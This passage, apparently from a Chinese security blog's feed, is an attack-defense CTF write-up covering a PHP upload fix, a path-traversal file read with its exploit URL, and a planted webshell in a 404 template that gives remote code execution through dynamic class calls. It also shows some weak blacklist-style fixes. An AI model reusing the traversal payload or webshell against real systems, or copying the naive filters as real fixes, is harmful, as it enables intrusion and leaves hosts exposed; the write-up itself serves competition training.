class="line">138</span><br><span class="line">139</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 支持上传大文件</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">upload</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$input</span>        = <span class="hljs-title function_ invoke__">input</span>(<span class="hljs-string">&#x27;post.&#x27;</span>);<br>    <span class="hljs-variable">$uploadPath</span>   = <span class="hljs-title function_ invoke__">public_path</span>().<span class="hljs-string">&#x27;upload/&#x27;</span>;<br>    <span class="hljs-variable">$uploadFile</span>   = <span class="hljs-variable language_">$this</span>-&gt;request-&gt;<span class="hljs-title function_ invoke__">file</span>(<span class="hljs-string">&#x27;file&#x27;</span>);<br>    <span class="hljs-variable">$originalName</span> = <span class="hljs-variable">$uploadFile</span>-&gt;<span class="hljs-title function_ invoke__">getOriginalName</span>();<br>    <span class="hljs-variable">$originalType</span> = <span class="hljs-title class_">FileAddons</span>::<span class="hljs-title function_ invoke__">getType</span>(<span class="hljs-title function_ invoke__">config</span>(<span class="hljs-string">&#x27;upload.ext&#x27;</span>),  <span class="hljs-variable">$originalName</span>);<br>    <span class="hljs-variable">$chunkId</span>      = <span class="hljs-keyword">empty</span>(<span class="hljs-variable">$input</span>[<span class="hljs-string">&#x27;id&#x27;</span>]) ? <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">sha1_file</span>(<span class="hljs-variable">$uploadFile</span>).<span class="hljs-variable">$input</span>[<span class="hljs-string">&#x27;size&#x27;</span>]) : <span class="hljs-variable">$input</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<br>    <span class="hljs-variable">$chunkIndex</span>   = <span class="hljs-variable">$input</span>[<span class="hljs-string">&#x27;index&#x27;</span>];<br>    <span class="hljs-variable">$chunkCount</span>   = <span class="hljs-variable">$input</span>[<span class="hljs-string">&#x27;count&#x27;</span>];<br>    <span class="hljs-variable">$chunkPath</span>    = <span class="hljs-string">&#x27;chunk/&#x27;</span>.<span class="hljs-variable">$chunkId</span>.<span class="hljs-string">&#x27;/&#x27;</span>;<br><br><br>    <span class="hljs-comment">// 增加的代码</span><br>    <span class="hljs-variable">$extension</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$uploadFile</span>-&gt;<span class="hljs-title function_ invoke__">getOriginalExtension</span>());<br>    <span class="hljs-variable">$allowedExtensions</span> = [<span class="hljs-string">&#x27;jpg&#x27;</span>, <span class="hljs-string">&#x27;jpeg&#x27;</span>, <span class="hljs-string">&#x27;png&#x27;</span>, <span class="hljs-string">&#x27;gif&#x27;</span>];<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$extension</span>, <span class="hljs-variable">$allowedExtensions</span>)) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ValidateException</span>(<span class="hljs-string">&#x27;只允许上传图片文件&#x27;</span>);<br>    &#125;<br><br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$originalType</span>)) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">json</span>([<span class="hljs-string">&#x27;status&#x27;</span> =&gt; <span class="hljs-string">&#x27;error&#x27;</span>, <span class="hljs-string">&#x27;message&#x27;</span> =&gt; <span class="hljs-string">&#x27;类型不支持，在常规管理中可配置！&#x27;</span>]);<br>    &#125;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-title function_ invoke__">validate</span>([ <span class="hljs-string">&#x27;file&#x27;</span> =&gt; [<span class="hljs-string">&#x27;fileSize&#x27;</span> =&gt; <span class="hljs-title function_ invoke__">config</span>(<span class="hljs-string">&#x27;upload.size&#x27;</span>)[<span class="hljs-variable">$originalType</span>], <span class="hljs-string">&#x27;fileExt&#x27;</span> =&gt; <span class="hljs-title function_ invoke__">config</span>(<span class="hljs-string">&#x27;upload.ext&#x27;</span>)[<span class="hljs-variable">$originalType</span>]] ])-&gt;<span class="hljs-title function_ invoke__">check</span>([<span class="hljs-string">&#x27;file&#x27;</span> =&gt; <span class="hljs-variable">$uploadFile</span>]);<br>    &#125; <span class="hljs-keyword">catch</span> (ValidateException <span class="hljs-variable">$e</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">json</span>([<span class="hljs-string">&#x27;status&#x27;</span> =&gt; <span class="hljs-string">&#x27;error&#x27;</span>, <span class="hljs-string">&#x27;message&#x27;</span> =&gt; <span class="hljs-variable">$e</span>-&gt;<span class="hljs-title function_ invoke__">getMessage</span>()]);<br>    &#125;<br>    <span class="hljs-comment">// 断点续传</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$chunkIndex</span> == <span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_dir</span>(<span class="hljs-variable">$uploadPath</span> . <span class="hljs-variable">$chunkPath</span>)) &#123;<br>           <span class="hljs-variable">$oldChunkIndex</span> = <span class="hljs-title function_ invoke__">count</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-variable">$uploadPath</span> . <span class="hljs-variable">$chunkPath</span>)) - <span class="hljs-number">3</span>; <br>           <span class="hljs-keyword">if</span> (<span class="hljs-variable">$oldChunkIndex</span> &gt; <span class="hljs-number">1</span>) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">json</span>([<span class="hljs-string">&#x27;status&#x27;</span> =&gt; <span class="hljs-string">&#x27;success&#x27;</span>, <span class="hljs-string">&#x27;message&#x27;</span> =&gt; <span class="hljs-string">&#x27;断点续传&#x27;</span>, <span class="hljs-string">&#x27;index&#x27;</span> =&gt; <span class="hljs-variable">$oldChunkIndex</span>, <span class="hljs-string">&#x27;id&#x27;</span> =&gt; <span class="hljs-variable">$chunkId</span>]);<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">// 分片写入</span><br>    <span class="hljs-title class_">Filesystem</span>::<span class="hljs-title function_ invoke__">disk</span>(<span class="hljs-string">&#x27;public&#x27;</span>)-&gt;<span class="hljs-title function_ invoke__">putFileAs</span>(<span class="hljs-variable">$chunkPath</span>, <span class="hljs-variable">$uploadFile</span>, <span class="hljs-variable">$chunkIndex</span> . <span class="hljs-string">&#x27;.tmp&#x27;</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$chunkIndex</span> &lt; <span class="hljs-variable">$chunkCount</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">json</span>([<span class="hljs-string">&#x27;status&#x27;</span> =&gt; <span class="hljs-string">&#x27;success&#x27;</span>, <span class="hljs-string">&#x27;message&#x27;</span> =&gt; <span class="hljs-string">&#x27;分片上传&#x27;</span>, <span class="hljs-string">&#x27;index&#x27;</span> =&gt; <span class="hljs-variable">$chunkIndex</span>, <span class="hljs-string">&#x27;id&#x27;</span> =&gt; <span class="hljs-variable">$chunkId</span>]);<br>    &#125;<br>    <span class="hljs-comment">// 分片检查</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">1</span>; <span class="hljs-variable">$i</span> &lt;= <span class="hljs-variable">$chunkCount</span>; <span class="hljs-variable">$i</span>++) &#123;<br>        <span class="hljs-keyword">if</span> (! <span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$uploadPath</span> . <span class="hljs-variable">$chunkPath</span> . <span class="hljs-variable">$i</span> . <span class="hljs-string">&#x27;.tmp&#x27;</span>)) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">json</span>([<span class="hljs-string">&#x27;status&#x27;</span> =&gt; <span class="hljs-string">&#x27;error&#x27;</span>, <span class="hljs-string">&#x27;message&#x27;</span> =&gt; <span class="hljs-string">&#x27;文件损坏，请重新上传&#x27;</span>]); <br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">// 分片合并</span><br>    <span class="hljs-variable">$filePath</span> = <span class="hljs-variable">$uploadPath</span> . <span class="hljs-variable">$originalType</span> . <span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&#x27;Ymd&#x27;</span>)  . <span class="hljs-string">&#x27;/&#x27;</span>;<br>    <span class="hljs-keyword">if</span> (! <span class="hljs-title function_ invoke__">is_dir</span>(<span class="hljs-variable">$filePath</span>)) &#123;<br>        <span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$filePath</span>, <span class="hljs-number">0777</span>, <span class="hljs-literal">true</span>);<br>    &#125;<br>    <span class="hljs-variable">$fileExt</span>   = <span class="hljs-variable">$uploadFile</span>-&gt;<span class="hljs-title function_ invoke__">getOriginalExtension</span>() ? <span class="hljs-variable">$uploadFile</span>-&gt;<span class="hljs-title function_ invoke__">getOriginalExtension</span>() : <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-title function_ invoke__">strrchr</span>(<span class="hljs-variable">$originalName</span>, <span class="hljs-string">&#x27;.&#x27;</span>), <span class="hljs-number">1</span>);<br>    <span class="hljs-variable">$fileName</span>  = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">microtime</span>(<span class="hljs-literal">true</span>) . <span class="hljs-variable">$originalName</span>) . <span class="hljs-string">&#x27;.&#x27;</span> . <span class="hljs-variable">$fileExt</span>;<br>    <span class="hljs-variable">$fileWrite</span> = @<span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-variable">$filePath</span> . <span class="hljs-variable">$fileName</span>, <span class="hljs-string">&quot;wb&quot;</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">flock</span>(<span class="hljs-variable">$fileWrite</span>, LOCK_EX)) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">1</span>; <span class="hljs-variable">$i</span> &lt;= <span class="hljs-variable">$chunkCount</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable">$uploadFile</span> = <span class="hljs-variable">$uploadPath</span> . <span class="hljs-variable">$chunkPath</span> . <span class="hljs-variable">$i</span> . <span class="hljs-string">&#x27;.tmp&#x27;</span>;<br>            <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$handle</span> = @<span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-variable">$uploadFile</span>, <span class="hljs-string">&quot;rb&quot;</span>)) &#123;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>            <span class="hljs-keyword">while</span> (<span class="hljs-variable">$buff</span> = <span class="hljs-title function_ invoke__">fread</span>(<span class="hljs-variable">$handle</span>, <span class="hljs-title function_ invoke__">filesize</span>(<span class="hljs-variable">$uploadFile</span>))) &#123;<br>                <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$fileWrite</span>, <span class="hljs-variable">$buff</span>);<br>            &#125;<br>            @<span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$handle</span>);<br>            @<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$uploadFile</span>); <span class="hljs-comment">//删除分片</span><br>        &#125;<br>        <span class="hljs-title function_ invoke__">flock</span>(<span class="hljs-variable">$fileWrite</span>, LOCK_UN);<br>    &#125;<br>    @<span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$fileWrite</span>);<br>    <span class="hljs-comment">// 存入数据库</span><br>    <span class="hljs-variable">$save</span> = <span class="hljs-title class_">FileModel</span>::<span class="hljs-title function_ invoke__">create</span>([<br>        <span class="hljs-string">&#x27;title&#x27;</span>       =&gt; <span class="hljs-variable">$originalName</span>,<br>        <span class="hljs-string">&#x27;type&#x27;</span>        =&gt; <span class="hljs-variable">$originalType</span>,<br>        <span class="hljs-string">&#x27;size&#x27;</span>        =&gt; <span class="hljs-variable">$input</span>[<span class="hljs-string">&#x27;size&#x27;</span>],<br>        <span class="hljs-string">&#x27;url&#x27;</span>         =&gt; <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-title function_ invoke__">public_path</span>(), <span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-variable">$filePath</span> . <span class="hljs-variable">$fileName</span>),<br>        <span class="hljs-string">&#x27;status&#x27;</span>      =&gt; <span class="hljs-number">1</span>,<br>        <span class="hljs-string">&#x27;theme&#x27;</span>       =&gt; <span class="hljs-title function_ invoke__">theme</span>(),<br>        <span class="hljs-string">&#x27;create_time&#x27;</span> =&gt; <span class="hljs-variable">$input</span>[<span class="hljs-string">&#x27;create_time&#x27;</span>],<br>    ]);<br>    <span class="hljs-comment">// 图片处理</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$originalType</span> === <span class="hljs-string">&quot;image&quot;</span> &amp;&amp; <span class="hljs-variable">$fileExt</span> != <span class="hljs-string">&#x27;ico&#x27;</span> &amp;&amp; <span class="hljs-variable">$fileExt</span> != <span class="hljs-string">&#x27;gif&#x27;</span>) &#123;<br>        <span class="hljs-comment">// 封面图片</span><br>        <span class="hljs-title function_ invoke__">thumbnail</span>(<span class="hljs-variable">$save</span>[<span class="hljs-string">&#x27;url&#x27;</span>],<span class="hljs-number">100</span>,<span class="hljs-number">100</span>);<br>        <span class="hljs-comment">// 水印图片</span><br>        <span class="hljs-variable">$watermark</span> = <span class="hljs-variable language_">$this</span>-&gt;request-&gt;watermark;<br>        <span class="hljs-keyword">if</span> (! <span class="hljs-keyword">empty</span>(<span class="hljs-variable">$watermark</span>)) &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$watermark</span>[<span class="hljs-string">&#x27;open&#x27;</span>] === <span class="hljs-number">1</span>) &#123;<br>                <span class="hljs-comment">// 水印图片</span><br>                <span class="hljs-variable">$watermarkConfig</span> = <span class="hljs-variable language_">$this</span>-&gt;request-&gt;watermark;<br>                <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$watermarkConfig</span>)) &#123;<br>                    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$watermarkConfig</span>[<span class="hljs-string">&#x27;open&#x27;</span>] === <span class="hljs-number">1</span>) &#123;<br>                        <span class="hljs-variable">$file</span>     = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;\/&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-title function_ invoke__">public_path</span>() . <span class="hljs-variable">$save</span>-&gt;url);<br>                        <span class="hljs-variable">$image</span>    = <span class="hljs-title class_">Image</span>::<span class="hljs-title function_ invoke__">open</span>(<span class="hljs-variable">$file</span>);<br>                        <span class="hljs-variable">$scale</span>    = (<span class="hljs-keyword">int</span>)<span class="hljs-variable">$watermarkConfig</span>[<span class="hljs-string">&#x27;scale&#x27;</span>] / <span class="hljs-number">100</span>;<br>                        <span class="hljs-variable">$position</span> = (<span class="hljs-keyword">int</span>)<span class="hljs-variable">$watermarkConfig</span>[<span class="hljs-string">&#x27;position&#x27;</span>];<br>                        <span class="hljs-variable">$opacity</span>  = (<span class="hljs-keyword">int</span>)<span class="hljs-variable">$watermarkConfig</span>[<span class="hljs-string">&#x27;opacity&#x27;</span>];<br>                        <span class="hljs-variable">$height</span>   = <span class="hljs-variable">$image</span>-&gt;<span class="hljs-title function_ invoke__">height</span>();<br>                        <span class="hljs-variable">$width</span>    = <span class="hljs-variable">$image</span>-&gt;<span class="hljs-title function_ invoke__">width</span>(); <br>                        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$watermarkConfig</span>[<span class="hljs-string">&#x27;type&#x27;</span>] === <span class="hljs-string">&#x27;image&#x27;</span>) &#123;<br>                            <span class="hljs-variable">$water</span> = <span class="hljs-title function_ invoke__">public_path</span>() . <span class="hljs-string">&#x27;upload/watermark.png&#x27;</span>;<br>                            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_file</span>(<span class="hljs-variable">$water</span>)) &#123;<br>                                <span class="hljs-keyword">if</span> (<span class="hljs-variable">$watermarkConfig</span>[<span class="hljs-string">&#x27;sizeType&#x27;</span>] === <span class="hljs-string">&#x27;scale&#x27;</span>) &#123;<br>                                    <span class="hljs-comment">// 按照比例</span><br>                                    <span class="hljs-variable">$thumb</span> = <span class="hljs-title class_">Image</span>::<span class="hljs-title function_ invoke__">open</span>(<span class="hljs-variable">$water</span>);<br>                                    <span class="hljs-variable">$waterName</span>  = <span class="hljs-title function_ invoke__">pathinfo</span>(<span class="hljs-variable">$save</span>-&gt;url, PATHINFO_FILENAME);<br>                                    <span class="hljs-variable">$waterThumb</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;watermark&#x27;</span>, <span class="hljs-string">&#x27;watermark_thumb&#x27;</span>, <span class="hljs-variable">$water</span>);<br>                                    <span class="hljs-variable">$thumb</span>-&gt;<span class="hljs-title function_ invoke__">thumb</span>(<span class="hljs-variable">$width</span>*<span class="hljs-variable">$scale</span>, <span class="hljs-variable">$height</span>*<span class="hljs-variable">$scale</span>)-&gt;<span class="hljs-title function_ invoke__">save</span>(<span class="hljs-variable">$waterThumb</span>);<br>                                    <span class="hljs-variable">$image</span>-&gt;<span class="hljs-title function_ invoke__">water</span>(<span class="hljs-variable">$waterThumb</span>, <span class="hljs-variable">$position</span>, <span class="hljs-variable">$opacity</span>)-&gt;<span class="hljs-title function_ invoke__">save</span>(<span class="hljs-variable">$file</span>);<br>                                    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_file</span>(<span class="hljs-variable">$waterThumb</span>)) &#123;<br>                                        <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$waterThumb</span>);<br>                                    &#125;<br>                                &#125; <span class="hljs-keyword">else</span> &#123;<br>                                    <span class="hljs-comment">// 按实际大小</span><br>                                    <span class="hljs-variable">$image</span>-&gt;<span class="hljs-title function_ invoke__">water</span>(<span class="hljs-variable">$water</span>, <span class="hljs-variable">$position</span>, <span class="hljs-variable">$opacity</span>)-&gt;<span class="hljs-title function_ invoke__">save</span>(<span class="hljs-variable">$file</span>);<br>                                &#125;<br>                            &#125;<br>                        &#125; <span class="hljs-keyword">else</span> &#123;<br>                            <span class="hljs-variable">$opacity</span>    = <span class="hljs-number">127</span> - (<span class="hljs-number">127</span> * <span class="hljs-variable">$opacity</span> / <span class="hljs-number">100</span>);<br>                            <span class="hljs-variable">$dechex</span>     = <span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$opacity</span>);<br>                            <span class="hljs-variable">$fontColor</span>  = <span class="hljs-variable">$watermarkConfig</span>[<span class="hljs-string">&#x27;fontColor&#x27;</span>].<span class="hljs-variable">$dechex</span>;<br>                            <span class="hljs-variable">$fontSize</span>   = <span class="hljs-variable">$watermarkConfig</span>[<span class="hljs-string">&#x27;sizeType&#x27;</span>] === <span class="hljs-string">&#x27;scale&#x27;</span> ? <span class="hljs-variable">$scale</span> * (<span class="hljs-variable">$width</span>/<span class="hljs-number">2</span>) : <span class="hljs-variable">$watermarkConfig</span>[<span class="hljs-string">&#x27;fontSize&#x27;</span>];<br>                            <span class="hljs-variable">$fontFamily</span> = <span class="hljs-title function_ invoke__">public_path</span>() . <span class="hljs-variable">$watermarkConfig</span>[<span class="hljs-string">&#x27;fontFamily&#x27;</span>];<br>                            <span class="hljs-variable">$image</span>-&gt;<span class="hljs-title function_ invoke__">text</span>(<span class="hljs-variable">$watermarkConfig</span>[<span class="hljs-string">&#x27;fontText&#x27;</span>], <span class="hljs-variable">$fontFamily</span>, <span class="hljs-variable">$fontSize</span>, <span class="hljs-variable">$fontColor</span>, <span class="hljs-variable">$position</span>, <span class="hljs-number">0</span>, <span class="hljs-variable">$watermarkConfig</span>[<span class="hljs-string">&#x27;fontAngle&#x27;</span>])-&gt;<span class="hljs-title function_ invoke__">save</span>(<span class="hljs-variable">$file</span>);<br>                        &#125;<br>                    &#125;<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">// 上传结束钩子</span><br>    <span class="hljs-title function_ invoke__">event</span>(<span class="hljs-string">&#x27;UploadEnd&#x27;</span>, <span class="hljs-variable">$save</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">json</span>([<span class="hljs-string">&#x27;status&#x27;</span> =&gt; <span class="hljs-string">&#x27;success&#x27;</span>, <span class="hljs-string">&#x27;message&#x27;</span> =&gt; <span class="hljs-string">&#x27;上传成功&#x27;</span>, <span class="hljs-string">&#x27;data&#x27;</span> =&gt; <span class="hljs-variable">$save</span>]);<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/awd/2024nb-9.png"></p><h2 id="漏洞4-任意文件读取"><a href="#漏洞4-任意文件读取" class="headerlink" title="漏洞4-任意文件读取"></a>漏洞4-任意文件读取</h2><p>在修漏洞3-任意文件上传的时候看到就在上传文件的代码的上面几行就是一个下载函数，没有任何过滤，可以直接利用</p><p><code>app/admin/controller/File.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 下载文件</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">download</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$input</span> = <span class="hljs-title function_ invoke__">input</span>();<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">download</span>(<span class="hljs-title function_ invoke__">public_path</span>() . <span class="hljs-variable">$input</span>[<span class="hljs-string">&#x27;url&#x27;</span>], <span class="hljs-variable">$input</span>[<span class="hljs-string">&#x27;title&#x27;</span>]);<br>&#125;<br></code></pre></td></tr></table></figure><p><code>/oka_admin/file/download?url=../../../../../../flag&amp;title=1.txt</code></p><p><img src="/img/awd/2024nb-10.png"></p><p><strong>修复</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 下载文件</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">download</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$input</span> = <span class="hljs-title function_ invoke__">input</span>();<br><br>    <span class="hljs-variable">$input</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;flag&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$input</span>);<br>    <span class="hljs-variable">$input</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;../&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$input</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">download</span>(<span class="hljs-title function_ invoke__">public_path</span>() . <span class="hljs-variable">$input</span>[<span class="hljs-string">&#x27;url&#x27;</span>], <span class="hljs-variable">$input</span>[<span class="hljs-string">&#x27;title&#x27;</span>]);<br>&#125;<br></code></pre></td></tr></table></figure><p>或者</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 下载文件</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">download</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$input</span> = <span class="hljs-title function_ invoke__">input</span>();<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$input</span>[<span class="hljs-string">&#x27;url&#x27;</span>],<span class="hljs-string">&#x27;flag&#x27;</span>)!==<span class="hljs-literal">false</span>)&#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&quot;No No&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">download</span>(<span class="hljs-title function_ invoke__">public_path</span>() . <span class="hljs-variable">$input</span>[<span class="hljs-string">&#x27;url&#x27;</span>], <span class="hljs-variable">$input</span>[<span class="hljs-string">&#x27;title&#x27;</span>]);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="漏洞5-rce"><a href="#漏洞5-rce" class="headerlink" title="漏洞5-rce"></a>漏洞5-rce</h2><p>审计发现<code>public/themes/template/404.html</code>包含恶意代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>], <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;aa&#x27;</span>], <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>], <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;bb&#x27;</span>], <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>])) &#123;<br>  <span class="hljs-variable">$a</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br>  <span class="hljs-variable">$aa</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;aa&#x27;</span>];<br>  <span class="hljs-variable">$b</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>];<br>  <span class="hljs-variable">$bb</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;bb&#x27;</span>];<br>  <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>  ((<span class="hljs-keyword">new</span> <span class="hljs-variable">$a</span>(<span class="hljs-variable">$aa</span>))-&gt;<span class="hljs-variable">$c</span>())((<span class="hljs-keyword">new</span> <span class="hljs-variable">$b</span>(<span class="hljs-variable">$bb</span>))-&gt;<span class="hljs-variable">$c</span>());<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&#x27;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/img/awd/2024nb-5.png"></p><p>访问任意不存在的文件使得404.html被包含即可通过Error内置类进行rce</p><p><img src="/img/awd/2024nb-6.png"></p><p><strong>修复</strong></p><p>直接删掉这段代码</p><h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><p>1：web靶机从第二轮开始基本所有队伍都上了通防，基本全靠pwn拿分了（偶尔会有几个web重置可以拿分）<br>2：网络环境很差，有的靶机访问特别慢<br>3：大概第四第五轮开始ssh中断，一直到结束前四十分钟才恢复<br>4：没与工作人员说明的情况下靶机被重置多次（好像很多队伍都被重置了。但是重置后ssh密码也被更改了，赛后才知道是123456）<br>5：大量靶机没有flag（可能有队伍提权了，不过猜测大概率是因为ssh连不上导致写不进flag）<br>6：flag提交的api接口有问题（例子：交了10个flag，全部显示flag错误，但是会加分）</p><p><img src="/img/awd/2024nb-11.png" alt="哈哈哈哈"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;pwn&quot;&gt;&lt;a href=&quot;#pwn&quot; class=&quot;headerlink&quot; title=&quot;pwn&quot;&gt;&lt;/a&gt;pwn&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;攻击&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;t</summary>
      
    
    
    
    <category term="wp" scheme="https://www.dr0n.top/categories/wp/"/>
    
    
    <category term="宁波" scheme="https://www.dr0n.top/tags/%E5%AE%81%E6%B3%A2/"/>
    
    <category term="awd" scheme="https://www.dr0n.top/tags/awd/"/>
    
  </entry>
  
  <entry>
    <title>第一届长城杯信息安全铁人三项赛决赛 取证溯源 wp</title>
    <link href="https://www.dr0n.top/posts/8ba5208d/"/>
    <id>https://www.dr0n.top/posts/8ba5208d/</id>
    <published>2024-05-24T10:00:00.000Z</published>
    <updated>2024-05-26T12:18:38.552Z</updated>
    
